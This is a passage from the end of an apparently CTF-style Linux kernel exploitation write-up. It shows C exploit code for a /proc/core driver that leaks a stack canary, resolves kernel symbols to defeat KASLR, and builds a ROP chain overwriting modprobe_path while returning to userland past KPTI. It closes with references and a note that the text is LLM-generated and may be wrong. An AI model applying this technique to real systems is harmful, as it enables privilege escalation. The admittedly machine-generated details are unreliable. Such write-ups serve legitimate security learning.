    save_status();

    fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        puts("\033[31m\033[1m[-] Open /proc/core failed.\033[0m");
        exit(0);
    }

    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {

        if (!swapgs_restore_regs_and_return_to_usermode && strcmp(name, "swapgs_restore_regs_and_return_to_usermode") == 0) {
            swapgs_restore_regs_and_return_to_usermode = addr;
            printf("\033[33m\033[1m[√] Found swapgs_restore_regs_and_return_to_usermode: %lx\033[0m\n", swapgs_restore_regs_and_return_to_usermode);
            break;
        }

    }

    offset = swapgs_restore_regs_and_return_to_usermode - 0xa008da - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] base: 0x%lx\033[0m\n", swapgs_restore_regs_and_return_to_usermode-0xa008da);
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = POP_RBX_RET + offset;
    rop[i++] = MODPROBE_PATH + offset;
    rop[i++] = POP_RAX_RET + offset;
    rop[i++] = *(size_t *) "/tmp/x";
    rop[i++] = MOV_PTR_RBX_RAX_POP_RBX_RET + offset;
    rop[i++] = *(size_t *) "muElnova";
    rop[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset;
    rop[i++] = *(size_t *) "muElnova";
    rop[i++] = *(size_t *) "muElnova";
    rop[i++] = (size_t) getFlag;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));
}
```

## References

https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/

[Kernel Pwn ROP bypass KPTI - Wings' Blog (wingszeng.top)](https://blog.wingszeng.top/kernel-pwn-rop-bypass-kpti/)

:::info
This Content is generated by LLM and might be wrong / incomplete, refer to Chinese version if you find something wrong.
:::

{/* AI */}
